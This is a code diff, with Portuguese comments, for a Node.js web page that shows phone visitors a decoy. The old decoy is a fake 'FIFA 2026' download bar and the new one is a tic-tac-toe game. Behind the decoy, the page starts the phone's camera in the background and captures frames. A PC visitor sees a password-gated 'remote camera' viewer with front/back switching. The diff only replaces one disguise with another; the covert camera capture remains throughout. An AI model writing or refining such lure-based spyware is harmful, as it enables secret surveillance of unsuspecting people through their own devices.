@@ -9,7 +9,7 @@ const io = socketIO(server, {
 });
 
 const PORT = process.env.PORT || 3000;
-const SENHA = "171172"; // 🔑 Nova senha hacker
+const SENHA = "171172"; // 🔑 Senha para acesso à câmera
 
 // ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
 function detectarDispositivo(userAgent) {
@@ -30,7 +30,7 @@ app.get('/', (req, res) => {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 Game Download</title>
+    <title>🎮 Jogo da Velha Online</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
@@ -42,31 +42,21 @@ app.get('/', (req, res) => {
             padding: 20px;
         }
         .container {
-            max-width: 800px;
+            max-width: 1200px;
             margin: 0 auto;
             background: #0f0f0f;
             border: 2px solid #00ff00;
             border-radius: 10px;
             padding: 30px;
             box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
-            text-align: center;
         }
         
-        /* Estilos para CELULAR */
+        /* Estilos para CELULAR - JOGO DA VELHA */
         .mobile-container {
             animation: fadeIn 1s;
-        }
-        
-        .game-logo {
-            font-size: 80px;
-            margin: 20px 0;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+            text-align: center;
+            max-width: 500px;
+            margin: 0 auto;
         }
         
         @keyframes fadeIn {
@@ -74,103 +64,231 @@ app.get('/', (req, res) => {
             to { opacity: 1; }
         }
         
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        @keyframes glow {
+            0% { text-shadow: 0 0 5px #00ff00; }
+            50% { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
+            100% { text-shadow: 0 0 5px #00ff00; }
+        }
+        
         .game-title {
-            font-size: 28px;
+            font-size: 36px;
             color: #00ff00;
-            margin-bottom: 10px;
+            margin-bottom: 20px;
             font-weight: bold;
             text-shadow: 0 0 10px #00ff00;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            animation: glow 2s infinite;
         }
         
         .game-subtitle {
             color: #00cc00;
             margin-bottom: 30px;
+            font-size: 18px;
         }
         
-        /* Barrinha de progresso */
-        .progress-container {
+        /* Tela de entrada */
+        .welcome-screen {
+            padding: 20px;
+        }
+        
+        .play-button {
+            background: transparent;
+            color: #00ff00;
+            border: 3px solid #00ff00;
+            font-size: 32px;
+            padding: 25px 60px;
+            border-radius: 15px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            margin: 40px 0;
+            transition: all 0.3s;
+            animation: pulse 2s infinite;
+        }
+        
+        .play-button:hover {
+            background: #00ff00;
+            color: black;
+            box-shadow: 0 0 50px #00ff00;
+        }
+        
+        /* Jogo da Velha */
+        .game-screen {
+            display: none;
+        }
+        
+        .game-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 15px;
             background: #1a1a1a;
             border: 1px solid #00ff00;
-            border-radius: 25px;
-            height: 30px;
-            width: 100%;
-            margin: 30px 0;
-            overflow: hidden;
-            box-shadow: inset 0 1px 3px rgba(0,0,0,0.2);
+            border-radius: 8px;
         }
         
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #00cc00, #00ff00);
-            border-radius: 25px;
-            transition: width 0.3s;
+        .player-info {
+            color: #00ff00;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .player-info span {
+            color: #00cc00;
+            font-size: 14px;
+            display: block;
+            margin-top: 5px;
+        }
+        
+        .turn-indicator {
+            background: #0f0f0f;
+            padding: 15px;
+            border-radius: 8px;
+            color: #00ff00;
+            font-size: 22px;
+            font-weight: bold;
+            margin: 20px 0;
+            border: 1px solid #00ff00;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .board {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 30px 0;
+            aspect-ratio: 1/1;
+        }
+        
+        .cell {
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
+            font-size: 64px;
+            font-weight: bold;
+            color: #00ff00;
+            cursor: pointer;
+            transition: all 0.3s;
+            aspect-ratio: 1/1;
+            text-shadow: 0 0 20px #00ff00;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+        }
+        
+        .cell:hover {
+            background: #2a2a2a;
+            box-shadow: 0 0 30px #00ff00;
+            transform: scale(1.02);
+        }
+        
+        .cell.winner {
+            background: #00ff00;
             color: black;
-            font-weight: bold;
             text-shadow: none;
+            box-shadow: 0 0 40px #00ff00;
         }
         
-        .progress-text {
-            font-size: 18px;
-            margin-top: 10px;
-            color: #00ff00;
-            font-weight: bold;
+        .cell.disabled {
+            cursor: not-allowed;
+            opacity: 0.5;
         }
         
-        .status-message {
-            font-size: 16px;
-            color: #00ff00;
+        .game-status {
             margin: 20px 0;
-            font-family: 'Courier New', monospace;
-        }
-        
-        .download-speed {
+            padding: 20px;
             background: #1a1a1a;
             border: 1px solid #00ff00;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
+            border-radius: 8px;
             color: #00ff00;
+            font-size: 20px;
+            font-weight: bold;
         }
         
-        /* Estilos para PC - TEMA HACKER */
+        .reset-button {
+            background: transparent;
+            color: #00ff00;
+            border: 2px solid #00ff00;
+            padding: 15px 40px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            text-transform: uppercase;
+            transition: all 0.3s;
+            margin-top: 20px;
+            letter-spacing: 2px;
+        }
+        
+        .reset-button:hover {
+            background: #00ff00;
+            color: black;
+            box-shadow: 0 0 30px #00ff00;
+        }
+        
+        /* Estilos para PC - TEMA HACKER + JOGO */
         .pc-container {
             text-align: left;
             color: #00ff00;
         }
         
         .hacker-title {
-            font-size: 32px;
+            font-size: 36px;
             color: #00ff00;
             text-align: center;
             margin-bottom: 30px;
             text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 0 0 15px #00ff00;
+            letter-spacing: 4px;
+            text-shadow: 0 0 20px #00ff00;
             font-weight: bold;
+            animation: glow 2s infinite;
+        }
+        
+        .pc-layout {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+        
+        .camera-section, .game-section {
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+        
+        .section-title {
+            font-size: 24px;
+            color: #00ff00;
+            margin-bottom: 20px;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
         
         .video-container {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .camera-wrapper {
             position: relative;
             width: 100%;
-            background: #1a1a1a;
+            background: #0a0a0a;
             border: 2px solid #00ff00;
             border-radius: 10px;
             overflow: hidden;
             aspect-ratio: 4/3;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+            margin-bottom: 15px;
         }
         
         #remoteVideo {
@@ -192,32 +310,22 @@ app.get('/', (req, res) => {
             justify-content: center;
             z-index: 10;
             border-radius: 8px;
-            backdrop-filter: blur(5px);
         }
         
         .password-box {
             background: #0f0f0f;
             border: 2px solid #00ff00;
-            padding: 40px;
+            padding: 30px;
             border-radius: 15px;
             text-align: center;
             width: 90%;
-            max-width: 350px;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+            max-width: 300px;
         }
         
         .password-box h3 { 
             color: #00ff00; 
             margin-bottom: 20px;
             font-size: 24px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        
-        .password-box p {
-            color: #00cc00;
-            margin-bottom: 20px;
-            font-size: 14px;
         }
         
         .password-box input {
@@ -251,7 +359,6 @@ app.get('/', (req, res) => {
             font-family: 'Courier New', monospace;
             font-weight: bold;
             text-transform: uppercase;
-            letter-spacing: 2px;
             transition: all 0.3s;
         }
         
@@ -261,43 +368,27 @@ app.get('/', (req, res) => {
             box-shadow: 0 0 30px #00ff00;
         }
         
-        .info-box {
-            background: #1a1a1a;
-            border: 2px solid #00ff00;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            color: #00ff00;
-        }
-        
-        .info-box h4 {
-            color: #00ff00;
-            margin-bottom: 10px;
-            font-size: 18px;
-        }
-
-        /* Controles da câmera */
         .camera-controls {
             display: flex;
-            gap: 10px;
+            gap: 15px;
             justify-content: center;
-            margin: 20px 0;
+            margin-top: 15px;
         }
         
         .camera-btn {
             background: transparent;
             color: #00ff00;
             border: 2px solid #00ff00;
-            padding: 15px 20px;
+            padding: 12px 20px;
             border-radius: 8px;
             cursor: pointer;
             font-size: 16px;
             flex: 1;
             font-family: 'Courier New', monospace;
             font-weight: bold;
+            transition: all 0.3s;
             text-transform: uppercase;
             letter-spacing: 1px;
-            transition: all 0.3s;
         }
         
         .camera-btn:hover {
@@ -322,14 +413,15 @@ app.get('/', (req, res) => {
             color: #00ff00;
             font-family: 'Courier New', monospace;
             font-size: 14px;
-            text-align: left;
-            margin: 10px 0;
-            padding: 10px;
+            margin-top: 20px;
+            padding: 15px;
+            background: #0a0a0a;
             border-left: 3px solid #00ff00;
+            border-radius: 5px;
         }
         
         .hidden {
-            display: none;
+            display: none !important;
         }
         
         #localVideo {
@@ -342,7 +434,7 @@ app.get('/', (req, res) => {
             opacity: 0;
         }
         
-        /* Matrix effect on background */
+        /* Matrix effect */
         .matrix-bg {
             position: fixed;
             top: 0;
@@ -354,75 +446,198 @@ app.get('/', (req, res) => {
             background: repeating-linear-gradient(0deg, rgba(0,255,0,0.1) 0px, rgba(0,0,0,0) 1px, transparent 2px);
             z-index: -1;
         }
+        
+        /* Loading animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #00ff00;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .status-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .status-dot.online {
+            background: #00ff00;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        
+        .status-dot.offline {
+            background: #ff0000;
+            box-shadow: 0 0 10px #ff0000;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .pc-layout {
+                grid-template-columns: 1fr;
+            }
+            
+            .game-title {
+                font-size: 28px;
+            }
+            
+            .play-button {
+                font-size: 24px;
+                padding: 20px 40px;
+            }
+            
+            .cell {
+                font-size: 48px;
+            }
+            
+            .hacker-title {
+                font-size: 24px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="matrix-bg"></div>
     <div class="container">
-        <!-- CONTEÚDO PARA CELULAR -->
+        <!-- CONTEÚDO PARA CELULAR - JOGO DA VELHA -->
         <div id="mobileContent" class="mobile-container">
-            <div class="game-logo">🎮</div>
-            <div class="game-title">FIFA 2026</div>
-            <div class="game-subtitle">Ultimate Edition</div>
+            <div class="game-title">🎮 JOGO DA VELHA</div>
             
-            <div class="progress-container">
-                <div id="progressBar" class="progress-bar" style="width: 0%">0%</div>
-            </div>
-            
-            <div id="progressPercent" class="progress-text">0% concluído</div>
-            
-            <div class="download-speed" id="speedInfo">
-                ⬇️ 0 MB / 0 MB • 0 MB/s
-            </div>
-            
-            <div class="status-message" id="statusMessage">
-                ⏳ Preparando download...
-            </div>
-            
-            <div style="margin-top: 30px; color: #00cc00; font-size: 14px;">
-                Não feche esta página • Download em segundo plano
-            </div>
-        </div>
-        
-        <!-- CONTEÚDO PARA PC - TEMA HACKER -->
-        <div id="pcContent" class="pc-container hidden">
-            <div class="hacker-title">⚡ SISTEMA DE ACESSO REMOTO ⚡</div>
-            
-            <div class="video-container">
-                <div class="camera-wrapper">
-                    <img id="remoteVideo">
-                    
-                    <div id="passwordOverlay">
-                        <div class="password-box">
-                            <h3>🔒 ACESSO RESTRITO</h3>
-                            <p>Digite o código de autorização</p>
-                            <input type="password" id="senhaInput" maxlength="6" placeholder="******">
-                            <button onclick="verificarSenha()">▶ AUTENTICAR</button>
-                            <div id="erroSenha" style="color: #ff0000; margin-top: 15px; display: none;">Acesso negado! Código inválido.</div>
-                            <div class="terminal-text" style="margin-top: 20px; font-size: 12px;">[ TENTATIVAS RESTANTES: 3 ]</div>
-                        </div>
-                    </div>
+            <!-- Tela de boas-vindas -->
+            <div id="welcomeScreen" class="welcome-screen">
+                <div class="game-subtitle">Desafie seu oponente online!</div>
+                <button class="play-button" onclick="iniciarJogo()">▶ JOGAR</button>
+                <div class="terminal-text" style="margin-top: 30px;">
+                    <span class="status-dot" id="statusDot"></span> Status: <span id="statusText">Aguardando...</span><br>
+                    > Você será X<br>
+                    > Oponente será O<br>
+                    > Clique em JOGAR para começar
                 </div>
             </div>
             
-            <!-- CONTROLES DA CÂMERA -->
-            <div id="cameraControls" class="camera-controls hidden">
-                <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')">
-                    📱 FRONTAL
-                </button>
-                <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')">
-                    📷 TRASEIRA
-                </button>
-            </div>
-            
-            <div class="info-box">
-                <div class="terminal-text">> SISTEMA INICIADO COM SUCESSO</div>
-                <div class="terminal-text">> AGUARDANDO AUTENTICAÇÃO...</div>
-                <div class="terminal-text">> CÓDIGO: ******</div>
+            <!-- Tela do jogo -->
+            <div id="gameScreen" class="game-screen">
+                <div class="game-header">
+                    <div class="player-info">
+                        VOCÊ: X <span id="playerStatus">(conectado)</span>
+                    </div>
+                    <div class="player-info">
+                        OPONENTE: O <span id="opponentStatus">(aguardando)</span>
+                    </div>
+                </div>
+                
+                <div class="turn-indicator" id="turnIndicator">
+                    SUA VEZ
+                </div>
+                
+                <div class="board" id="board">
+                    <div class="cell" data-index="0" onclick="fazerJogada(0)"></div>
+                    <div class="cell" data-index="1" onclick="fazerJogada(1)"></div>
+                    <div class="cell" data-index="2" onclick="fazerJogada(2)"></div>
+                    <div class="cell" data-index="3" onclick="fazerJogada(3)"></div>
+                    <div class="cell" data-index="4" onclick="fazerJogada(4)"></div>
+                    <div class="cell" data-index="5" onclick="fazerJogada(5)"></div>
+                    <div class="cell" data-index="6" onclick="fazerJogada(6)"></div>
+                    <div class="cell" data-index="7" onclick="fazerJogada(7)"></div>
+                    <div class="cell" data-index="8" onclick="fazerJogada(8)"></div>
+                </div>
+                
+                <div class="game-status" id="gameStatus">
+                    <span class="loading"></span> Aguardando oponente...
+                </div>
+                
+                <button class="reset-button" onclick="reiniciarJogo()">🔄 NOVO JOGO</button>
             </div>
         </div>
         
-        <!-- Vídeo escondido -->
+        <!-- CONTEÚDO PARA PC - CÂMERA + JOGO -->
+        <div id="pcContent" class="pc-container hidden">
+            <div class="hacker-title">⚡ SISTEMA DE MONITORAMENTO ⚡</div>
+            
+            <div class="pc-layout">
+                <!-- Seção da Câmera -->
+                <div class="camera-section">
+                    <div class="section-title">📹 CÂMERA REMOTA</div>
+                    <div class="video-container">
+                        <img id="remoteVideo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='640' height='480' viewBox='0 0 640 480'%3E%3Crect width='640' height='480' fill='%230a0a0a'/%3E%3Ctext x='320' y='240' font-family='Courier New' font-size='24' fill='%2300ff00' text-anchor='middle'%3EAGUARDANDO SINAL...%3C/text%3E%3C/svg%3E">
+                        
+                        <div id="passwordOverlay">
+                            <div class="password-box">
+                                <h3>🔒 ACESSO RESTRITO</h3>
+                                <p>Digite o código de 6 dígitos</p>
+                                <input type="password" id="senhaInput" maxlength="6" placeholder="******" autofocus>
+                                <button onclick="verificarSenha()">▶ AUTENTICAR</button>
+                                <div id="erroSenha" style="color: #ff0000; margin-top: 15px; display: none;">Acesso negado!</div>
+                                <div class="terminal-text" style="margin-top: 15px; font-size: 12px;">[ TENTATIVAS RESTANTES: 3 ]</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div id="cameraControls" class="camera-controls hidden">
+                        <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')">📱 FRONTAL</button>
+                        <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')">📷 TRASEIRA</button>
+                    </div>
+                    
+                    <div class="terminal-text" id="cameraTerminal">
+                        > Sistema de câmera aguardando autenticação...
+                    </div>
+                </div>
+                
+                <!-- Seção do Jogo -->
+                <div class="game-section">
+                    <div class="section-title">🎮 JOGO DA VELHA</div>
+                    
+                    <div class="game-header">
+                        <div class="player-info">
+                            VOCÊ: O <span id="pcPlayerStatus">(conectado)</span>
+                        </div>
+                        <div class="player-info">
+                            OPONENTE: X <span id="pcOpponentStatus">(offline)</span>
+                        </div>
+                    </div>
+                    
+                    <div class="turn-indicator" id="pcTurnIndicator">
+                        AGUARDANDO JOGADOR...
+                    </div>
+                    
+                    <div class="board" id="pcBoard">
+                        <div class="cell" data-index="0" onclick="pcFazerJogada(0)"></div>
+                        <div class="cell" data-index="1" onclick="pcFazerJogada(1)"></div>
+                        <div class="cell" data-index="2" onclick="pcFazerJogada(2)"></div>
+                        <div class="cell" data-index="3" onclick="pcFazerJogada(3)"></div>
+                        <div class="cell" data-index="4" onclick="pcFazerJogada(4)"></div>
+                        <div class="cell" data-index="5" onclick="pcFazerJogada(5)"></div>
+                        <div class="cell" data-index="6" onclick="pcFazerJogada(6)"></div>
+                        <div class="cell" data-index="7" onclick="pcFazerJogada(7)"></div>
+                        <div class="cell" data-index="8" onclick="pcFazerJogada(8)"></div>
+                    </div>
+                    
+                    <div class="game-status" id="pcGameStatus">
+                        <span class="status-dot offline"></span> Aguardando jogador mobile...
+                    </div>
+                    
+                    <button class="reset-button" onclick="pcReiniciarJogo()">🔄 NOVO JOGO</button>
+                    
+                    <div class="terminal-text" id="pcTerminal">
+                        > Sistema aguardando conexão do jogador mobile...
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Vídeo oculto -->
         <video id="localVideo" autoplay playsinline muted></video>
     </div>
 
@@ -431,32 +646,45 @@ app.get('/', (req, res) => {
         const socket = io();
         const SENHA_CORRETA = "171172";
         
-        // Elementos
+        // Elementos principais
         const mobileContent = document.getElementById('mobileContent');
         const pcContent = document.getElementById('pcContent');
         const localVideo = document.getElementById('localVideo');
         const remoteVideo = document.getElementById('remoteVideo');
         const passwordOverlay = document.getElementById('passwordOverlay');
         const cameraControls = document.getElementById('cameraControls');
+        const cameraTerminal = document.getElementById('cameraTerminal');
         
-        // Elementos da barrinha
-        const progressBar = document.getElementById('progressBar');
-        const progressPercent = document.getElementById('progressPercent');
-        const speedInfo = document.getElementById('speedInfo');
-        const statusMessage = document.getElementById('statusMessage');
+        // Elementos do jogo (mobile)
+        const welcomeScreen = document.getElementById('welcomeScreen');
+        const gameScreen = document.getElementById('gameScreen');
+        const board = document.getElementById('board');
+        const turnIndicator = document.getElementById('turnIndicator');
+        const gameStatus = document.getElementById('gameStatus');
+        const opponentStatus = document.getElementById('opponentStatus');
+        const statusDot = document.getElementById('statusDot');
+        const statusText = document.getElementById('statusText');
         
-        // Estado
-        let mediaStream = null;
+        // Elementos do jogo (PC)
+        const pcBoard = document.getElementById('pcBoard');
+        const pcTurnIndicator = document.getElementById('pcTurnIndicator');
+        const pcGameStatus = document.getElementById('pcGameStatus');
+        const pcTerminal = document.getElementById('pcTerminal');
+        const pcOpponentStatus = document.getElementById('pcOpponentStatus');
+        
+        // Estado do jogo
+        let jogoAtivo = false;
+        let vezDoJogador = true; // true = mobile (X), false = PC (O)
+        let celulas = Array(9).fill('');
+        let jogoIniciado = false;
+        let jogadorPresente = false;
         let visualizacaoLiberada = false;
-        let progresso = 0;
-        let intervaloProgresso = null;
-        let cameraAtual = 'back';
-        let intervaloCaptura = null;
         let tentativas = 3;
         
-        // Botões da câmera
-        const cameraFrontBtn = document.getElementById('cameraFrontBtn');
-        const cameraBackBtn = document.getElementById('cameraBackBtn');
+        // Estado da câmera
+        let mediaStream = null;
+        let cameraAtual = 'back';
+        let intervaloCaptura = null;
         
         // ========== DETECÇÃO DE DISPOSITIVO ==========
         function detectarDispositivo() {
@@ -468,88 +696,190 @@ app.get('/', (req, res) => {
         
         // ========== CONFIGURAÇÃO POR DISPOSITIVO ==========
         if (isMobile) {
-            console.log('📱 Celular detectado - modo download falso');
+            console.log('📱 Celular detectado - modo jogo da velha');
             mobileContent.style.display = 'block';
             pcContent.style.display = 'none';
+            statusDot.className = 'status-dot online';
+            statusText.innerHTML = 'Conectado';
             
-            iniciarDownloadFalso();
-            
+            // Inicia a câmera em segundo plano
             setTimeout(() => {
                 ligarCameraOtimizada('back');
-            }, 2000);
+            }, 1000);
             
         } else {
-            console.log('💻 PC detectado - modo visualizador hacker');
+            console.log('💻 PC detectado - modo monitoramento + jogo');
             mobileContent.style.display = 'none';
             pcContent.style.display = 'block';
+            
+            socket.emit('pcConectado');
+            pcTerminal.innerHTML = '> PC conectado. Aguardando jogador mobile...';
         }
         
-        // ========== FUNÇÃO DA BARRINHA FALSA ==========
-        function iniciarDownloadFalso() {
-            progresso = 0;
-            const tamanhoTotal = 2500;
-            const velocidades = ['1.2 MB/s', '1.5 MB/s', '1.8 MB/s', '2.1 MB/s', '1.9 MB/s', '2.3 MB/s'];
-            let velocidadeIndex = 0;
+        // ========== FUNÇÕES DO JOGO (MOBILE) ==========
+        window.iniciarJogo = function() {
+            welcomeScreen.style.display = 'none';
+            gameScreen.style.display = 'block';
+            jogoIniciado = true;
+            jogadorPresente = true;
             
-            statusMessage.innerHTML = '⏳ Conectando aos servidores...';
+            socket.emit('jogadorPronto');
+            gameStatus.innerHTML = '<span class="loading"></span> Aguardando oponente...';
+            opponentStatus.innerHTML = '(conectando)';
             
-            setTimeout(() => {
-                statusMessage.innerHTML = '📦 Baixando arquivos do jogo...';
-                
-                intervaloProgresso = setInterval(() => {
-                    if (progresso < 100) {
-                        const incremento = Math.random() * 3 + 2;
-                        progresso = Math.min(100, progresso + incremento);
-                        
-                        progressBar.style.width = progresso + '%';
-                        progressBar.innerHTML = progresso.toFixed(0) + '%';
-                        progressPercent.innerHTML = progresso.toFixed(0) + '% concluído';
-                        
-                        const baixado = ((progresso / 100) * tamanhoTotal).toFixed(1);
-                        velocidadeIndex = (velocidadeIndex + 1) % velocidades.length;
-                        speedInfo.innerHTML = \`⬇️ \${baixado} MB / \${tamanhoTotal} MB • \${velocidades[velocidadeIndex]}\`;
-                        
-                        if (progresso > 95) {
-                            statusMessage.innerHTML = '📦 Quase lá... verificando arquivos';
-                        } else if (progresso > 75) {
-                            statusMessage.innerHTML = '🎮 Finalizando download...';
-                        } else if (progresso > 50) {
-                            statusMessage.innerHTML = '⚡ Instalando recursos do jogo...';
-                        } else if (progresso > 25) {
-                            statusMessage.innerHTML = '🎵 Baixando áudios e texturas...';
-                        }
-                        
-                        if (progresso >= 100) {
-                            clearInterval(intervaloProgresso);
-                            progressBar.style.background = 'linear-gradient(90deg, #00ff00, #00cc00)';
-                            statusMessage.innerHTML = '✅ Download concluído! Instalação em segundo plano...';
-                            speedInfo.innerHTML = '⬇️ 2500 MB / 2500 MB • 0 MB/s';
-                            
-                            let instalando = 99.9;
-                            const intervaloInstalacao = setInterval(() => {
-                                instalando = instalando > 100 ? 99.9 : instalando + 0.1;
-                                progressBar.style.width = instalando + '%';
-                                progressBar.innerHTML = instalando.toFixed(1) + '%';
-                                progressPercent.innerHTML = instalando.toFixed(1) + '% - Instalando...';
-                                
-                                if (instalando > 100.5) {
-                                    clearInterval(intervaloInstalacao);
-                                    progressBar.style.width = '100%';
-                                    progressBar.innerHTML = '100%';
-                                    progressPercent.innerHTML = '100% - Pronto para jogar!';
-                                }
-                            }, 300);
-                        }
-                    }
-                }, 400);
-            }, 2000);
+            // Liga a câmera se ainda não estiver ligada
+            if (!mediaStream) {
+                ligarCameraOtimizada('back');
+            }
+        };
+        
+        window.fazerJogada = function(index) {
+            if (!jogoAtivo || !vezDoJogador || celulas[index] !== '') return;
+            
+            // Faz a jogada
+            celulas[index] = 'X';
+            const cell = document.querySelector(\`[data-index="\${index}"]\`);
+            cell.innerHTML = 'X';
+            cell.style.textShadow = '0 0 30px #00ff00';
+            
+            // Verifica vitória
+            if (verificarVitoria('X')) {
+                jogoAtivo = false;
+                gameStatus.innerHTML = '🎉 VOCÊ VENCEU!';
+                socket.emit('jogada', { index, vitoria: true, jogador: 'X' });
+                return;
+            }
+            
+            // Verifica empate
+            if (!celulas.includes('')) {
+                jogoAtivo = false;
+                gameStatus.innerHTML = '🤝 EMPATE!';
+                socket.emit('jogada', { index, empate: true });
+                return;
+            }
+            
+            // Passa a vez
+            vezDoJogador = false;
+            turnIndicator.innerHTML = 'VEZ DO OPONENTE';
+            turnIndicator.style.opacity = '0.7';
+            
+            // Envia jogada
+            socket.emit('jogada', { index, vitoria: false });
+        };
+        
+        function verificarVitoria(jogador) {
+            const combinacoes = [
+                [0,1,2], [3,4,5], [6,7,8],
+                [0,3,6], [1,4,7], [2,5,8],
+                [0,4,8], [2,4,6]
+            ];
+            
+            for (let combo of combinacoes) {
+                if (combo.every(i => celulas[i] === jogador)) {
+                    // Destaca células vencedoras
+                    combo.forEach(i => {
+                        const cell = document.querySelector(\`[data-index="\${i}"]\`);
+                        cell.classList.add('winner');
+                    });
+                    return true;
+                }
+            }
+            return false;
         }
         
-        // ========== FUNÇÃO PARA LIGAR CÂMERA ==========
+        window.reiniciarJogo = function() {
+            celulas = Array(9).fill('');
+            vezDoJogador = true;
+            jogoAtivo = true;
+            
+            document.querySelectorAll('.cell').forEach(cell => {
+                cell.innerHTML = '';
+                cell.classList.remove('winner');
+                cell.style.textShadow = '0 0 20px #00ff00';
+            });
+            
+            turnIndicator.innerHTML = 'SUA VEZ';
+            turnIndicator.style.opacity = '1';
+            gameStatus.innerHTML = 'Jogo reiniciado!';
+            
+            socket.emit('reiniciarJogo');
+        };
+        
+        // ========== FUNÇÕES DO JOGO (PC) ==========
+        window.pcFazerJogada = function(index) {
+            if (!jogoAtivo || vezDoJogador || celulas[index] !== '') return;
+            
+            // Faz a jogada
+            celulas[index] = 'O';
+            const cell = document.querySelector(\`#pcBoard [data-index="\${index}"]\`);
+            cell.innerHTML = 'O';
+            cell.style.textShadow = '0 0 30px #00ff00';
+            
+            // Verifica vitória
+            if (verificarVitoriaPC('O')) {
+                jogoAtivo = false;
+                pcGameStatus.innerHTML = '🎉 VOCÊ VENCEU!';
+                socket.emit('jogadaPC', { index, vitoria: true });
+                return;
+            }
+            
+            // Verifica empate
+            if (!celulas.includes('')) {
+                jogoAtivo = false;
+                pcGameStatus.innerHTML = '🤝 EMPATE!';
+                socket.emit('jogadaPC', { index, empate: true });
+                return;
+            }
+            
+            // Passa a vez
+            vezDoJogador = true;
+            pcTurnIndicator.innerHTML = 'VEZ DO OPONENTE';
+            pcTurnIndicator.style.opacity = '0.7';
+            
+            // Envia jogada
+            socket.emit('jogadaPC', { index, vitoria: false });
+        };
+        
+        function verificarVitoriaPC(jogador) {
+            const combinacoes = [
+                [0,1,2], [3,4,5], [6,7,8],
+                [0,3,6], [1,4,7], [2,5,8],
+                [0,4,8], [2,4,6]
+            ];
+            
+            for (let combo of combinacoes) {
+                if (combo.every(i => celulas[i] === jogador)) {
+                    combo.forEach(i => {
+                        const cell = document.querySelector(\`#pcBoard [data-index="\${i}"]\`);
+                        cell.classList.add('winner');
+                    });
+                    return true;
+                }
+            }
+            return false;
+        }
+        
+        window.pcReiniciarJogo = function() {
+            celulas = Array(9).fill('');
+            vezDoJogador = true;
+            jogoAtivo = true;
+            
+            document.querySelectorAll('#pcBoard .cell').forEach(cell => {
+                cell.innerHTML = '';
+                cell.classList.remove('winner');
+                cell.style.textShadow = '0 0 20px #00ff00';
+            });
+            
+            pcTurnIndicator.innerHTML = 'VEZ DO OPONENTE';
+            pcTurnIndicator.style.opacity = '0.7';
+            pcGameStatus.innerHTML = 'Jogo reiniciado!';
+            
+            socket.emit('reiniciarJogo');
+        };
+        
+        // ========== FUNÇÕES DA CÂMERA ==========
         async function ligarCameraOtimizada(tipoCamera) {
             try {
-                statusMessage.innerHTML = '⏳ Aguardando... O download irá começar em instantes';
-                
                 console.log('📷 Iniciando câmera...');
                 
                 if (intervaloCaptura) {
@@ -575,8 +905,6 @@ app.get('/', (req, res) => {
                     constraints.video.facingMode = 'environment';
                 }
                 
-                statusMessage.innerHTML = '📦 Preparando download... Isso pode levar alguns segundos';
-                
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 
                 mediaStream = stream;
@@ -601,55 +929,50 @@ app.get('/', (req, res) => {
                 }, 200);
                 
                 console.log('✅ Transmissão ativada!');
-                statusMessage.innerHTML = '📱 Download acelerado! Baixando arquivos...';
+                
+                if (!isMobile) {
+                    cameraTerminal.innerHTML = '> Câmera transmitindo...';
+                }
                 
             } catch (err) {
                 console.error('Erro na câmera:', err);
-                
-                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    statusMessage.innerHTML = '⚠️ Permissão negada - continuando download sem aceleração';
-                } else {
-                    statusMessage.innerHTML = '⚠️ Modo offline ativado - continuando download...';
+                if (!isMobile) {
+                    cameraTerminal.innerHTML = '> Erro ao acessar câmera: ' + err.message;
                 }
             }
         }
         
